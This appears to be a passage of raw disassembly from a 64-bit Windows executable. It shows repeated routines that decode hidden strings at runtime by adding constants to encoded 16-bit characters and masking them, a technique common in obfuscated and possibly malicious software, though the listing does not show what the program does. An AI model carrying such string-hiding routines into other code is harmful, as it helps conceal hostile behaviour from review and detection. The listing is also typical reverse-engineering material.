   140004a7f:	8d 93 af 7d 00 00    	lea    0x7daf(%rbx),%edx
   140004a85:	66 81 e2 ff 00       	and    $0xff,%dx
   140004a8a:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004a8e:	48 39 c1             	cmp    %rax,%rcx
   140004a91:	75 e5                	jne    0x140004a78
   140004a93:	c6 05 08 73 57 00 00 	movb   $0x0,0x577308(%rip)        # 0x14057bda2
   140004a9a:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004a9f:	4c 8d 05 ea 72 57 00 	lea    0x5772ea(%rip),%r8        # 0x14057bd90
   140004aa6:	4c 89 f1             	mov    %r14,%rcx
   140004aa9:	48 8d 9c 24 b4 17 00 	lea    0x17b4(%rsp),%rbx
   140004ab0:	00 
   140004ab1:	e8 1f d1 ff ff       	call   0x140001bd5
   140004ab6:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140004abb:	48 89 ea             	mov    %rbp,%rdx
   140004abe:	e8 bd f4 ff ff       	call   0x140003f80
   140004ac3:	85 c0                	test   %eax,%eax
   140004ac5:	0f 84 56 01 00 00    	je     0x140004c21
   140004acb:	45 84 ed             	test   %r13b,%r13b
   140004ace:	0f 84 a5 00 00 00    	je     0x140004b79
   140004ad4:	80 3d 2d 72 57 00 00 	cmpb   $0x0,0x57722d(%rip)        # 0x14057bd08
   140004adb:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004ae0:	48 8d 35 b9 27 57 00 	lea    0x5727b9(%rip),%rsi        # 0x1405772a0
   140004ae7:	b9 17 00 00 00       	mov    $0x17,%ecx
   140004aec:	f3 a5                	rep movsl (%rsi),(%rdi)
   140004aee:	48 8d 05 2b 72 57 00 	lea    0x57722b(%rip),%rax        # 0x14057bd20
   140004af5:	75 29                	jne    0x140004b20
   140004af7:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004afc:	b9 17 00 00 00       	mov    $0x17,%ecx
   140004b01:	48 89 c7             	mov    %rax,%rdi
   140004b04:	c6 05 71 72 57 00 01 	movb   $0x1,0x577271(%rip)        # 0x14057bd7c
   140004b0b:	f3 a5                	rep movsl (%rsi),(%rdi)
   140004b0d:	48 8d 0d 5a c8 ff ff 	lea    -0x37a6(%rip),%rcx        # 0x14000136e
   140004b14:	c6 05 ed 71 57 00 01 	movb   $0x1,0x5771ed(%rip)        # 0x14057bd08
   140004b1b:	e8 15 c8 ff ff       	call   0x140001335
   140004b20:	80 3d 55 72 57 00 00 	cmpb   $0x0,0x577255(%rip)        # 0x14057bd7c
   140004b27:	74 2d                	je     0x140004b56
   140004b29:	48 8d 05 f0 71 57 00 	lea    0x5771f0(%rip),%rax        # 0x14057bd20
   140004b30:	48 8d 48 5c          	lea    0x5c(%rax),%rcx
   140004b34:	66 8b 30             	mov    (%rax),%si
   140004b37:	48 83 c0 02          	add    $0x2,%rax
   140004b3b:	8d 96 cb df ff ff    	lea    -0x2035(%rsi),%edx
   140004b41:	66 81 e2 ff 00       	and    $0xff,%dx
   140004b46:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004b4a:	48 39 c8             	cmp    %rcx,%rax
   140004b4d:	75 e5                	jne    0x140004b34
   140004b4f:	c6 05 26 72 57 00 00 	movb   $0x0,0x577226(%rip)        # 0x14057bd7c
   140004b56:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140004b5b:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004b60:	4d 89 e0             	mov    %r12,%r8
   140004b63:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004b68:	4c 8d 0d b1 71 57 00 	lea    0x5771b1(%rip),%r9        # 0x14057bd20
   140004b6f:	e8 da d6 ff ff       	call   0x14000224e
   140004b74:	e9 b1 00 00 00       	jmp    0x140004c2a
   140004b79:	80 3d a8 70 57 00 00 	cmpb   $0x0,0x5770a8(%rip)        # 0x14057bc28
   140004b80:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004b85:	48 8d 35 74 27 57 00 	lea    0x572774(%rip),%rsi        # 0x140577300
   140004b8c:	b9 c2 00 00 00       	mov    $0xc2,%ecx
   140004b91:	f3 a4                	rep movsb (%rsi),(%rdi)
   140004b93:	48 8d 05 a6 70 57 00 	lea    0x5770a6(%rip),%rax        # 0x14057bc40
   140004b9a:	75 29                	jne    0x140004bc5
   140004b9c:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004ba1:	b9 c2 00 00 00       	mov    $0xc2,%ecx
   140004ba6:	48 89 c7             	mov    %rax,%rdi
   140004ba9:	c6 05 52 71 57 00 01 	movb   $0x1,0x577152(%rip)        # 0x14057bd02
   140004bb0:	f3 a4                	rep movsb (%rsi),(%rdi)
   140004bb2:	48 8d 0d b4 c7 ff ff 	lea    -0x384c(%rip),%rcx        # 0x14000136d
   140004bb9:	c6 05 68 70 57 00 01 	movb   $0x1,0x577068(%rip)        # 0x14057bc28
   140004bc0:	e8 70 c7 ff ff       	call   0x140001335
   140004bc5:	80 3d 36 71 57 00 00 	cmpb   $0x0,0x577136(%rip)        # 0x14057bd02
   140004bcc:	74 30                	je     0x140004bfe
   140004bce:	48 8d 05 6b 70 57 00 	lea    0x57706b(%rip),%rax        # 0x14057bc40
   140004bd5:	48 8d 88 c2 00 00 00 	lea    0xc2(%rax),%rcx
   140004bdc:	66 8b 30             	mov    (%rax),%si
   140004bdf:	48 83 c0 02          	add    $0x2,%rax
   140004be3:	8d 96 ab c7 ff ff    	lea    -0x3855(%rsi),%edx
   140004be9:	66 81 e2 ff 00       	and    $0xff,%dx
   140004bee:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004bf2:	48 39 c1             	cmp    %rax,%rcx
   140004bf5:	75 e5                	jne    0x140004bdc
   140004bf7:	c6 05 04 71 57 00 00 	movb   $0x0,0x577104(%rip)        # 0x14057bd02
   140004bfe:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140004c03:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004c08:	4d 89 f0             	mov    %r14,%r8
   140004c0b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c10:	4c 8d 0d 29 70 57 00 	lea    0x577029(%rip),%r9        # 0x14057bc40
   140004c17:	e8 32 d6 ff ff       	call   0x14000224e
   140004c1c:	e9 87 01 00 00       	jmp    0x140004da8
   140004c21:	45 84 ed             	test   %r13b,%r13b
   140004c24:	0f 84 7e 01 00 00    	je     0x140004da8
   140004c2a:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004c2f:	31 c0                	xor    %eax,%eax
   140004c31:	b9 82 00 00 00       	mov    $0x82,%ecx
   140004c36:	80 3d b3 6f 57 00 00 	cmpb   $0x0,0x576fb3(%rip)        # 0x14057bbf0
   140004c3d:	48 8d 35 9c 27 57 00 	lea    0x57279c(%rip),%rsi        # 0x1405773e0
   140004c44:	4c 8d b4 24 d0 00 00 	lea    0xd0(%rsp),%r14
   140004c4b:	00 
   140004c4c:	f3 ab                	rep stos %eax,(%rdi)
   140004c4e:	48 8d bc 24 d0 00 00 	lea    0xd0(%rsp),%rdi
   140004c55:	00 
   140004c56:	b9 09 00 00 00       	mov    $0x9,%ecx
   140004c5b:	48 8d 05 9e 6f 57 00 	lea    0x576f9e(%rip),%rax        # 0x14057bc00
   140004c62:	f3 a5                	rep movsl (%rsi),(%rdi)
   140004c64:	75 27                	jne    0x140004c8d
   140004c66:	b9 09 00 00 00       	mov    $0x9,%ecx
   140004c6b:	48 89 c7             	mov    %rax,%rdi
   140004c6e:	4c 89 f6             	mov    %r14,%rsi
   140004c71:	c6 05 ac 6f 57 00 01 	movb   $0x1,0x576fac(%rip)        # 0x14057bc24
   140004c78:	f3 a5                	rep movsl (%rsi),(%rdi)
   140004c7a:	48 8d 0d eb c6 ff ff 	lea    -0x3915(%rip),%rcx        # 0x14000136c
   140004c81:	c6 05 68 6f 57 00 01 	movb   $0x1,0x576f68(%rip)        # 0x14057bbf0
   140004c88:	e8 a8 c6 ff ff       	call   0x140001335
   140004c8d:	80 3d 90 6f 57 00 00 	cmpb   $0x0,0x576f90(%rip)        # 0x14057bc24
   140004c94:	74 2d                	je     0x140004cc3
   140004c96:	48 8d 05 63 6f 57 00 	lea    0x576f63(%rip),%rax        # 0x14057bc00
   140004c9d:	48 8d 48 24          	lea    0x24(%rax),%rcx
   140004ca1:	66 8b 30             	mov    (%rax),%si
   140004ca4:	48 83 c0 02          	add    $0x2,%rax
   140004ca8:	8d 96 a1 01 00 00    	lea    0x1a1(%rsi),%edx
   140004cae:	66 81 e2 ff 00       	and    $0xff,%dx
   140004cb3:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004cb7:	48 39 c8             	cmp    %rcx,%rax
   140004cba:	75 e5                	jne    0x140004ca1
   140004cbc:	c6 05 61 6f 57 00 00 	movb   $0x0,0x576f61(%rip)        # 0x14057bc24
   140004cc3:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004cc8:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004ccd:	4c 89 f7             	mov    %r14,%rdi
   140004cd0:	4c 8d 05 29 6f 57 00 	lea    0x576f29(%rip),%r8        # 0x14057bc00
   140004cd7:	48 8d 35 42 27 57 00 	lea    0x572742(%rip),%rsi        # 0x140577420
   140004cde:	e8 f2 ce ff ff       	call   0x140001bd5
   140004ce3:	4c 8b 44 24 58       	mov    0x58(%rsp),%r8
   140004ce8:	8b 15 06 12 57 00    	mov    0x571206(%rip),%edx        # 0x140575ef4
   140004cee:	48 8d 0d 2b 0c 57 00 	lea    0x570c2b(%rip),%rcx        # 0x140575920
   140004cf5:	4c 8d 0d 04 23 57 00 	lea    0x572304(%rip),%r9        # 0x140577000
   140004cfc:	e8 da da ff ff       	call   0x1400027db
   140004d01:	80 3d 40 6e 57 00 00 	cmpb   $0x0,0x576e40(%rip)        # 0x14057bb48
   140004d08:	b9 8a 00 00 00       	mov    $0x8a,%ecx
   140004d0d:	48 8d 05 4c 6e 57 00 	lea    0x576e4c(%rip),%rax        # 0x14057bb60
   140004d14:	f3 a4                	rep movsb (%rsi),(%rdi)
   140004d16:	75 27                	jne    0x140004d3f
   140004d18:	b9 8a 00 00 00       	mov    $0x8a,%ecx
   140004d1d:	48 89 c7             	mov    %rax,%rdi
   140004d20:	4c 89 f6             	mov    %r14,%rsi
   140004d23:	c6 05 c0 6e 57 00 01 	movb   $0x1,0x576ec0(%rip)        # 0x14057bbea
   140004d2a:	f3 a4                	rep movsb (%rsi),(%rdi)
   140004d2c:	48 8d 0d 38 c6 ff ff 	lea    -0x39c8(%rip),%rcx        # 0x14000136b
   140004d33:	c6 05 0e 6e 57 00 01 	movb   $0x1,0x576e0e(%rip)        # 0x14057bb48
   140004d3a:	e8 f6 c5 ff ff       	call   0x140001335
   140004d3f:	80 3d a4 6e 57 00 00 	cmpb   $0x0,0x576ea4(%rip)        # 0x14057bbea
   140004d46:	74 30                	je     0x140004d78
   140004d48:	48 8d 05 11 6e 57 00 	lea    0x576e11(%rip),%rax        # 0x14057bb60
   140004d4f:	48 8d 88 8a 00 00 00 	lea    0x8a(%rax),%rcx
   140004d56:	66 8b 38             	mov    (%rax),%di
   140004d59:	48 83 c0 02          	add    $0x2,%rax
   140004d5d:	8d 97 1d a3 ff ff    	lea    -0x5ce3(%rdi),%edx
   140004d63:	66 81 e2 ff 00       	and    $0xff,%dx
   140004d68:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004d6c:	48 39 c1             	cmp    %rax,%rcx
   140004d6f:	75 e5                	jne    0x140004d56
   140004d71:	c6 05 72 6e 57 00 00 	movb   $0x0,0x576e72(%rip)        # 0x14057bbea
   140004d78:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140004d7d:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004d82:	4d 89 e0             	mov    %r12,%r8
   140004d85:	4c 8d 0d d4 6d 57 00 	lea    0x576dd4(%rip),%r9        # 0x14057bb60
   140004d8c:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140004d91:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004d96:	e8 b3 d4 ff ff       	call   0x14000224e
   140004d9b:	48 89 d9             	mov    %rbx,%rcx
   140004d9e:	e8 96 da ff ff       	call   0x140002839
   140004da3:	e9 a8 00 00 00       	jmp    0x140004e50
   140004da8:	80 3d a9 6c 57 00 00 	cmpb   $0x0,0x576ca9(%rip)        # 0x14057ba58
   140004daf:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004db4:	48 8d 35 05 27 57 00 	lea    0x572705(%rip),%rsi        # 0x1405774c0
   140004dbb:	b9 38 00 00 00       	mov    $0x38,%ecx
   140004dc0:	f3 a5                	rep movsl (%rsi),(%rdi)
   140004dc2:	48 8d 05 97 6c 57 00 	lea    0x576c97(%rip),%rax        # 0x14057ba60
   140004dc9:	75 29                	jne    0x140004df4
   140004dcb:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004dd0:	b9 38 00 00 00       	mov    $0x38,%ecx
   140004dd5:	48 89 c7             	mov    %rax,%rdi
   140004dd8:	c6 05 61 6d 57 00 01 	movb   $0x1,0x576d61(%rip)        # 0x14057bb40
   140004ddf:	f3 a5                	rep movsl (%rsi),(%rdi)
   140004de1:	48 8d 0d 82 c5 ff ff 	lea    -0x3a7e(%rip),%rcx        # 0x14000136a
   140004de8:	c6 05 69 6c 57 00 01 	movb   $0x1,0x576c69(%rip)        # 0x14057ba58
   140004def:	e8 41 c5 ff ff       	call   0x140001335
   140004df4:	80 3d 45 6d 57 00 00 	cmpb   $0x0,0x576d45(%rip)        # 0x14057bb40
   140004dfb:	74 30                	je     0x140004e2d
   140004dfd:	48 8d 05 5c 6c 57 00 	lea    0x576c5c(%rip),%rax        # 0x14057ba60
   140004e04:	48 8d 88 e0 00 00 00 	lea    0xe0(%rax),%rcx
   140004e0b:	66 8b 30             	mov    (%rax),%si
   140004e0e:	48 83 c0 02          	add    $0x2,%rax
   140004e12:	8d 96 43 bd ff ff    	lea    -0x42bd(%rsi),%edx
   140004e18:	66 81 e2 ff 00       	and    $0xff,%dx
   140004e1d:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004e21:	48 39 c1             	cmp    %rax,%rcx
   140004e24:	75 e5                	jne    0x140004e0b
   140004e26:	c6 05 13 6d 57 00 00 	movb   $0x0,0x576d13(%rip)        # 0x14057bb40
   140004e2d:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140004e32:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004e37:	4d 89 f0             	mov    %r14,%r8
   140004e3a:	4c 8d 0d 1f 6c 57 00 	lea    0x576c1f(%rip),%r9        # 0x14057ba60
   140004e41:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140004e46:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004e4b:	e8 fe d3 ff ff       	call   0x14000224e
   140004e50:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140004e55:	48 89 ea             	mov    %rbp,%rdx
   140004e58:	e8 23 f1 ff ff       	call   0x140003f80
   140004e5d:	85 c0                	test   %eax,%eax
   140004e5f:	0f 84 68 01 00 00    	je     0x140004fcd
   140004e65:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140004e6a:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   140004e71:	00 
   140004e72:	e8 e7 d7 ff ff       	call   0x14000265e
   140004e77:	44 8b 84 24 d0 00 00 	mov    0xd0(%rsp),%r8d
   140004e7e:	00 
   140004e7f:	48 89 e9             	mov    %rbp,%rcx
   140004e82:	48 89 c2             	mov    %rax,%rdx
   140004e85:	e8 d3 d8 ff ff       	call   0x14000275d
   140004e8a:	45 84 ed             	test   %r13b,%r13b
   140004e8d:	0f 84 94 00 00 00    	je     0x140004f27
   140004e93:	80 3d 4e 6b 57 00 00 	cmpb   $0x0,0x576b4e(%rip)        # 0x14057b9e8
   140004e9a:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004e9f:	48 8d 35 fa 26 57 00 	lea    0x5726fa(%rip),%rsi        # 0x1405775a0
   140004ea6:	b9 14 00 00 00       	mov    $0x14,%ecx
   140004eab:	f3 a5                	rep movsl (%rsi),(%rdi)
   140004ead:	48 8d 05 4c 6b 57 00 	lea    0x576b4c(%rip),%rax        # 0x14057ba00
   140004eb4:	75 27                	jne    0x140004edd
   140004eb6:	b9 14 00 00 00       	mov    $0x14,%ecx
   140004ebb:	48 89 c7             	mov    %rax,%rdi
   140004ebe:	48 89 de             	mov    %rbx,%rsi
   140004ec1:	c6 05 88 6b 57 00 01 	movb   $0x1,0x576b88(%rip)        # 0x14057ba50
   140004ec8:	f3 a5                	rep movsl (%rsi),(%rdi)
   140004eca:	48 8d 0d 98 c4 ff ff 	lea    -0x3b68(%rip),%rcx        # 0x140001369
   140004ed1:	c6 05 10 6b 57 00 01 	movb   $0x1,0x576b10(%rip)        # 0x14057b9e8
   140004ed8:	e8 58 c4 ff ff       	call   0x140001335
   140004edd:	80 3d 6c 6b 57 00 00 	cmpb   $0x0,0x576b6c(%rip)        # 0x14057ba50
   140004ee4:	74 2d                	je     0x140004f13
   140004ee6:	48 8d 05 13 6b 57 00 	lea    0x576b13(%rip),%rax        # 0x14057ba00
   140004eed:	48 8d 48 50          	lea    0x50(%rax),%rcx
   140004ef1:	66 8b 18             	mov    (%rax),%bx
   140004ef4:	48 83 c0 02          	add    $0x2,%rax
   140004ef8:	8d 93 17 93 ff ff    	lea    -0x6ce9(%rbx),%edx
   140004efe:	66 81 e2 ff 00       	and    $0xff,%dx
   140004f03:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004f07:	48 39 c8             	cmp    %rcx,%rax
   140004f0a:	75 e5                	jne    0x140004ef1
   140004f0c:	c6 05 3d 6b 57 00 00 	movb   $0x0,0x576b3d(%rip)        # 0x14057ba50
   140004f13:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140004f18:	4c 8d 0d e1 6a 57 00 	lea    0x576ae1(%rip),%r9        # 0x14057ba00
   140004f1f:	4d 89 e0             	mov    %r12,%r8
   140004f22:	e9 95 00 00 00       	jmp    0x140004fbc
   140004f27:	80 3d aa 6a 57 00 00 	cmpb   $0x0,0x576aaa(%rip)        # 0x14057b9d8
   140004f2e:	75 2d                	jne    0x140004f5d
   140004f30:	48 8d 0d 31 c4 ff ff 	lea    -0x3bcf(%rip),%rcx        # 0x140001368
   140004f37:	c6 05 a8 6a 57 00 01 	movb   $0x1,0x576aa8(%rip)        # 0x14057b9e6
   140004f3e:	c7 05 98 6a 57 00 a0 	movl   $0xce00a0,0x576a98(%rip)        # 0x14057b9e0
   140004f45:	00 ce 00 
   140004f48:	66 c7 05 93 6a 57 00 	movw   $0x7b,0x576a93(%rip)        # 0x14057b9e4
   140004f4f:	7b 00 
   140004f51:	c6 05 80 6a 57 00 01 	movb   $0x1,0x576a80(%rip)        # 0x14057b9d8
   140004f58:	e8 d8 c3 ff ff       	call   0x140001335
   140004f5d:	80 3d 82 6a 57 00 00 	cmpb   $0x0,0x576a82(%rip)        # 0x14057b9e6
   140004f64:	74 47                	je     0x140004fad
   140004f66:	8b 05 74 6a 57 00    	mov    0x576a74(%rip),%eax        # 0x14057b9e0
   140004f6c:	c6 05 73 6a 57 00 00 	movb   $0x0,0x576a73(%rip)        # 0x14057b9e6
   140004f73:	66 2d 7b 62          	sub    $0x627b,%ax
   140004f77:	66 25 ff 00          	and    $0xff,%ax
   140004f7b:	66 89 05 5e 6a 57 00 	mov    %ax,0x576a5e(%rip)        # 0x14057b9e0
   140004f82:	66 8b 05 59 6a 57 00 	mov    0x576a59(%rip),%ax        # 0x14057b9e2
   140004f89:	66 2d 7b 62          	sub    $0x627b,%ax
   140004f8d:	66 25 ff 00          	and    $0xff,%ax
   140004f91:	66 89 05 4a 6a 57 00 	mov    %ax,0x576a4a(%rip)        # 0x14057b9e2
   140004f98:	8b 05 46 6a 57 00    	mov    0x576a46(%rip),%eax        # 0x14057b9e4
   140004f9e:	66 2d 7b 62          	sub    $0x627b,%ax
   140004fa2:	66 25 ff 00          	and    $0xff,%ax
   140004fa6:	66 89 05 37 6a 57 00 	mov    %ax,0x576a37(%rip)        # 0x14057b9e4
   140004fad:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140004fb2:	4c 8d 0d 27 6a 57 00 	lea    0x576a27(%rip),%r9        # 0x14057b9e0
   140004fb9:	49 89 e8             	mov    %rbp,%r8
   140004fbc:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004fc1:	31 c9                	xor    %ecx,%ecx
   140004fc3:	e8 86 d2 ff ff       	call   0x14000224e
   140004fc8:	e9 69 05 00 00       	jmp    0x140005536
   140004fcd:	80 3d b4 69 57 00 00 	cmpb   $0x0,0x5769b4(%rip)        # 0x14057b988
   140004fd4:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004fd9:	48 8d 35 20 26 57 00 	lea    0x572620(%rip),%rsi        # 0x140577600
   140004fe0:	b9 36 00 00 00       	mov    $0x36,%ecx
   140004fe5:	4c 63 0d 14 94 00 00 	movslq 0x9414(%rip),%r9        # 0x14000e400
   140004fec:	48 8d 2d ad 69 57 00 	lea    0x5769ad(%rip),%rbp        # 0x14057b9a0
   140004ff3:	f3 a4                	rep movsb (%rsi),(%rdi)
   140004ff5:	75 33                	jne    0x14000502a
   140004ff7:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004ffc:	b9 36 00 00 00       	mov    $0x36,%ecx
   140005001:	48 89 ef             	mov    %rbp,%rdi
   140005004:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140005009:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000500b:	48 8d 0d 55 c3 ff ff 	lea    -0x3cab(%rip),%rcx        # 0x140001367
   140005012:	c6 05 bd 69 57 00 01 	movb   $0x1,0x5769bd(%rip)        # 0x14057b9d6
   140005019:	c6 05 68 69 57 00 01 	movb   $0x1,0x576968(%rip)        # 0x14057b988
   140005020:	e8 10 c3 ff ff       	call   0x140001335
   140005025:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
   14000502a:	80 3d a5 69 57 00 00 	cmpb   $0x0,0x5769a5(%rip)        # 0x14057b9d6
   140005031:	74 2d                	je     0x140005060
   140005033:	48 8d 05 66 69 57 00 	lea    0x576966(%rip),%rax        # 0x14057b9a0
   14000503a:	48 8d 48 36          	lea    0x36(%rax),%rcx
   14000503e:	66 8b 38             	mov    (%rax),%di
   140005041:	48 83 c0 02          	add    $0x2,%rax
   140005045:	8d 97 0f 7b 00 00    	lea    0x7b0f(%rdi),%edx
   14000504b:	66 81 e2 ff 00       	and    $0xff,%dx
   140005050:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140005054:	48 39 c1             	cmp    %rax,%rcx
   140005057:	75 e5                	jne    0x14000503e
   140005059:	c6 05 76 69 57 00 00 	movb   $0x0,0x576976(%rip)        # 0x14057b9d6
   140005060:	31 c0                	xor    %eax,%eax
   140005062:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140005069:	00 
   14000506a:	48 89 ea             	mov    %rbp,%rdx
   14000506d:	48 89 df             	mov    %rbx,%rdi
   140005070:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005075:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   14000507a:	4c 8d 05 7f 0f 00 00 	lea    0xf7f(%rip),%r8        # 0x140006000
   140005081:	48 8d 35 b8 25 57 00 	lea    0x5725b8(%rip),%rsi        # 0x140577640
   140005088:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   14000508d:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140005092:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005097:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000509c:	e8 db c2 ff ff       	call   0x14000137c
   1400050a1:	e8 c2 c3 ff ff       	call   0x140001468
   1400050a6:	80 3d 93 68 57 00 00 	cmpb   $0x0,0x576893(%rip)        # 0x14057b940
   1400050ad:	b9 09 00 00 00       	mov    $0x9,%ecx
   1400050b2:	f3 a5                	rep movsl (%rsi),(%rdi)
   1400050b4:	41 89 c5             	mov    %eax,%r13d
   1400050b7:	48 8d 05 a2 68 57 00 	lea    0x5768a2(%rip),%rax        # 0x14057b960
   1400050be:	75 27                	jne    0x1400050e7
   1400050c0:	b9 09 00 00 00       	mov    $0x9,%ecx
   1400050c5:	48 89 c7             	mov    %rax,%rdi
   1400050c8:	48 89 de             	mov    %rbx,%rsi
   1400050cb:	c6 05 b2 68 57 00 01 	movb   $0x1,0x5768b2(%rip)        # 0x14057b984
   1400050d2:	f3 a5                	rep movsl (%rsi),(%rdi)
   1400050d4:	48 8d 0d 8b c2 ff ff 	lea    -0x3d75(%rip),%rcx        # 0x140001366
   1400050db:	c6 05 5e 68 57 00 01 	movb   $0x1,0x57685e(%rip)        # 0x14057b940
   1400050e2:	e8 4e c2 ff ff       	call   0x140001335
   1400050e7:	80 3d 96 68 57 00 00 	cmpb   $0x0,0x576896(%rip)        # 0x14057b984
   1400050ee:	74 2d                	je     0x14000511d
   1400050f0:	48 8d 05 69 68 57 00 	lea    0x576869(%rip),%rax        # 0x14057b960
   1400050f7:	48 8d 48 24          	lea    0x24(%rax),%rcx
   1400050fb:	66 8b 30             	mov    (%rax),%si
   1400050fe:	48 83 c0 02          	add    $0x2,%rax
   140005102:	8d 96 1f c7 ff ff    	lea    -0x38e1(%rsi),%edx
   140005108:	66 81 e2 ff 00       	and    $0xff,%dx
   14000510d:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140005111:	48 39 c1             	cmp    %rax,%rcx
   140005114:	75 e5                	jne    0x1400050fb
   140005116:	c6 05 67 68 57 00 00 	movb   $0x0,0x576867(%rip)        # 0x14057b984
   14000511d:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   140005122:	8b 15 c8 cb 00 00    	mov    0xcbc8(%rip),%edx        # 0x140011cf0
   140005128:	4c 8d 0d 31 68 57 00 	lea    0x576831(%rip),%r9        # 0x14057b960
   14000512f:	48 8d 0d ea 92 00 00 	lea    0x92ea(%rip),%rcx        # 0x14000e420
   140005136:	e8 a0 d6 ff ff       	call   0x1400027db
   14000513b:	80 3d e6 67 57 00 00 	cmpb   $0x0,0x5767e6(%rip)        # 0x14057b928
   140005142:	75 2b                	jne    0x14000516f
   140005144:	48 8d 0d 1a c2 ff ff 	lea    -0x3de6(%rip),%rcx        # 0x140001365
   14000514b:	c6 05 e6 67 57 00 01 	movb   $0x1,0x5767e6(%rip)        # 0x14057b938
   140005152:	48 b8 8b 00 80 00 85 	movabs $0x1300850080008b,%rax
   140005159:	00 13 00 
   14000515c:	48 89 05 cd 67 57 00 	mov    %rax,0x5767cd(%rip)        # 0x14057b930
   140005163:	c6 05 be 67 57 00 01 	movb   $0x1,0x5767be(%rip)        # 0x14057b928
   14000516a:	e8 c6 c1 ff ff       	call   0x140001335
   14000516f:	80 3d c2 67 57 00 00 	cmpb   $0x0,0x5767c2(%rip)        # 0x14057b938
   140005176:	4c 8d 3d b3 67 57 00 	lea    0x5767b3(%rip),%r15        # 0x14057b930
   14000517d:	74 29                	je     0x1400051a8
   14000517f:	4c 89 f8             	mov    %r15,%rax
   140005182:	49 8d 4f 08          	lea    0x8(%r15),%rcx
   140005186:	66 8b 38             	mov    (%rax),%di
   140005189:	48 83 c0 02          	add    $0x2,%rax
   14000518d:	8d 97 ed 57 00 00    	lea    0x57ed(%rdi),%edx
   140005193:	66 81 e2 ff 00       	and    $0xff,%dx
   140005198:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   14000519c:	48 39 c8             	cmp    %rcx,%rax
   14000519f:	75 e5                	jne    0x140005186
   1400051a1:	c6 05 90 67 57 00 00 	movb   $0x0,0x576790(%rip)        # 0x14057b938
   1400051a8:	80 3d 21 67 57 00 00 	cmpb   $0x0,0x576721(%rip)        # 0x14057b8d0
   1400051af:	48 8d 35 ca 24 57 00 	lea    0x5724ca(%rip),%rsi        # 0x140577680
   1400051b6:	b9 46 00 00 00       	mov    $0x46,%ecx
   1400051bb:	48 89 df             	mov    %rbx,%rdi
   1400051be:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400051c0:	48 8d 2d 19 67 57 00 	lea    0x576719(%rip),%rbp        # 0x14057b8e0
   1400051c7:	75 27                	jne    0x1400051f0
   1400051c9:	b9 46 00 00 00       	mov    $0x46,%ecx
   1400051ce:	48 89 ef             	mov    %rbp,%rdi
   1400051d1:	48 89 de             	mov    %rbx,%rsi
   1400051d4:	c6 05 4b 67 57 00 01 	movb   $0x1,0x57674b(%rip)        # 0x14057b926
   1400051db:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400051dd:	48 8d 0d 80 c1 ff ff 	lea    -0x3e80(%rip),%rcx        # 0x140001364
   1400051e4:	c6 05 e5 66 57 00 01 	movb   $0x1,0x5766e5(%rip)        # 0x14057b8d0
   1400051eb:	e8 45 c1 ff ff       	call   0x140001335
   1400051f0:	80 3d 2f 67 57 00 00 	cmpb   $0x0,0x57672f(%rip)        # 0x14057b926
   1400051f7:	74 2d                	je     0x140005226
   1400051f9:	48 8d 05 e0 66 57 00 	lea    0x5766e0(%rip),%rax        # 0x14057b8e0
   140005200:	48 8d 48 46          	lea    0x46(%rax),%rcx
   140005204:	66 8b 30             	mov    (%rax),%si
   140005207:	48 83 c0 02          	add    $0x2,%rax
   14000520b:	8d 96 ed 57 00 00    	lea    0x57ed(%rsi),%edx
   140005211:	66 81 e2 ff 00       	and    $0xff,%dx
